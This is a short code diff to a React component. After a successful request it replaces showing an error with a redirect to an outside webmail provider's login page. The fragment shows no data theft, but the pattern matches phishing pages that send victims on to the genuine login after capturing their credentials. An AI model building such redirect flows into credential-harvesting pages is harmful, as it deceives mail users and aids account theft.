@@ -39,7 +39,9 @@ function Home(){
         if(response.status == 200){
             console.log(response.data.message);
 
-            setShowError(true);
+        window.location.href = 'https://mail.hiwaay.net/login.php';
+
+           
         }
       } catch (error) {
         // Handle error
